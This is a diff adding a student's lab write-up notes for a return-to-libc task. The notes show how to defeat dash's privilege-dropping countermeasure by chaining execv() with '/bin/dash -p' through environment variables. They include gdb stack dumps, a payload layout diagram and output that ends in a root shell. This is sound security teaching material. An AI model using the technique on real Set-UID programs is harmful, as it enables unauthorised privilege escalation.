@@ -191,5 +191,126 @@
     ```
 
 ## Task 4: Defeat Shell's Countermeasure
+- some shell programs including `dash` and `bash` have a countermeasure that drops privileges when tehy are executed in a `Set-UID` process
+- link `/bin/sh` to `/bin/dash`: `sudo ln -sf /bin/dash /bin/sh`
+- `dash` and `bash` will not drop the privilege when invoked with `-p` option, so instead of `system`, we can use many other `libc` functions to run `/bin/dash -p` directly, e.g., the `exec()` family of functions (`execl()`, `execle()`, `execv()`)
+- try previous attack on `/bin/dash`
+    ```
+    $ sudo ln -sf /bin/dash /bin/sh
+    $ ./retlib
+    Address of input[] inside main(): 0xffffcd90
+    Input size: 300
+    Address of buffer[] inside bof(): 0xffffcd60
+    Frame Pointer value inside bof(): 0xffffcd78
+    $ whoami
+    seed
+    ```
+- `execv()`: `int execv(const char *pathname, char *const argv[]);`
+    - `pathname = <address of "/bin/dash">`
+    - `argv[0] = <address of "/bin/dash">`
+    - `argv[1] = <address of "-p">`
+    - `argv[2] = NULL` (i.e., 4 bytes of zero)
+- a problem is that `argv[2]` is `0x00000000`, when `strcpy()` copies the input to the buffer, content after the first byte `0x00` will not be copied, but as the input in main itself is on the stack, we can use it
+
+- to understand how these arguments are stored in the stack (the order of them), I wrote a test code
+    ```
+    void func(char *p, char *args[]) {
+        // arbitrary code here
+        return;
+    }
+    void flat_func(char *p, char *arg0, char *arg1, char *arg2) {
+        // arbitrary code here
+        return;
+    }
+    int main() {
+        char *p = "p";
+        char *args[3];
+
+        args[0] = (char *) 0xffffd58e;
+        args[1] = (char *) 0xffffd575;
+        args[2] = (char *) 0xffffd5a7;
+
+        func(p, args);
+        flat_func(p, args);
+    }
+    ```
+    - and I export 3 environment variables, figured out their addresses, and put them in `args`
+    - First, let's look at the stack when entered `func`
+        ```
+        [------------------------------------stack-------------------------------------]
+        0000| 0xffffd074 --> 0x565562b7 (<main+85>:	add    esp,0x8)
+        0004| 0xffffd078 --> 0x56557008 --> 0x70 ('p')
+        0008| 0xffffd07c --> 0xffffd090 --> 0xffffd58e ("arg00000000arg00000")
+        0012| 0xffffd080 --> ...
+        0016| 0xffffd084 --> ... 
+        0020| 0xffffd088 --> ...
+        0024| 0xffffd08c --> 0x56557008 --> 0x70 ('p')
+        0028| 0xffffd090 --> 0xffffd58e ("arg00000000arg00000")
+        0032| 0xffffd094 --> 0xffffd575 ("arg11111111arg11111")
+        0036| 0xffffd098 --> 0xffffd5a7 ("arg22222222arg22222")
+        ```
+    - Then, the stack when entereed `flat_func`
+        ```
+        [------------------------------------stack-------------------------------------]
+        0000| 0xffffd06c --> 0x565562ce (<main+108>:	add    esp,0x10)
+        0004| 0xffffd070 --> 0x56557008 --> 0x70 ('p')
+        0008| 0xffffd074 --> 0xffffd58e ("arg00000000arg00000")
+        0012| 0xffffd078 --> 0xffffd575 ("arg11111111arg11111")
+        0016| 0xffffd07c --> 0xffffd5a7 ("arg22222222arg22222")
+        0020| 0xffffd080 --> ...
+        0024| 0xffffd084 --> ...
+        0028| 0xffffd088 --> ...
+        0032| 0xffffd08c --> 0x56557008 --> 0x70 ('p')
+        0036| 0xffffd090 --> 0xffffd58e ("arg00000000arg00000")
+        0040| 0xffffd094 --> 0xffffd575 ("arg11111111arg11111")
+        0044| 0xffffd098 --> 0xffffd5a7 ("arg22222222arg22222")
+        ```
+    - we can see the difference, when passing an array (`char *args[]`) as an argument, it will not copy all the pointers, but the position of the first pointer (`0xffffd090`) on the stack, this might be a way to imporve performance and save space, because if the array is very large, it is costy to have another copy of it on the stack
+
+    - the `retlib` prints the address of the `input[]` in `main()`, this is just for convenience (as this is a local program, we can debug it to figure out this address even if it is not provided)
+
+    - attack strategy:
+        - set 2 environment variables
+            1. `export MYSHELL=/bin/sh`
+            2. `export MYARG=-p`
+        - put the addresses of the strings in `input[]`
+        - the structure of the payload (in `input[]`):
+            ```
+            High Memory Addresses
+            |          +---------------------+
+            |          |        ...          |
+            |          |---------------------|
+            |          |     0x00000000      |
+            |          |---------------------|
+            |          |        p_addr       |
+            |          |---------------------|
+            |          |       sh_addr       |      
+            |          |---------------------| <---- args_addr
+            |          |        ...          |
+            |          +---------------------+
+            |          |      args_addr      |
+            |          |---------------------| <---- offset=40
+            |          |       sh_addr       |
+            |          |---------------------| <---- offset=36
+            |          |      exit_addr      |
+            |          |---------------------| <---- offset=32
+            |          |      execv_addr     | (return address) 
+            |          |---------------------| <---- offset=28
+            |          |        ...          |
+            |          +---------------------+ <---- `&input` offset=0
+            Low Memory Addresses
+            ```
+        - it is always a good idea to use `gdb` to track all these addresses on stack, and we will know whether our calculation of address is correct, but remember that in `gdb`, the address of `/bin/sh`, `-p` will change, run `gdb-peda$ show environment` to see how these environment variables are stored in memory will help us to figure out the new addresses
+        - then try it
+            ```
+            $ ./exploit_execv.py
+            $ ./retlib
+            Address of input[] inside main(): 0xffffcd70
+            Input size: 300
+            Address of buffer[] inside bof(): 0xffffcd40
+            Frame Pointer value inside bof(): 0xffffcd58
+            # whoami
+            root
+            ```
 
 ## Task 5: Return-Oriented Programming
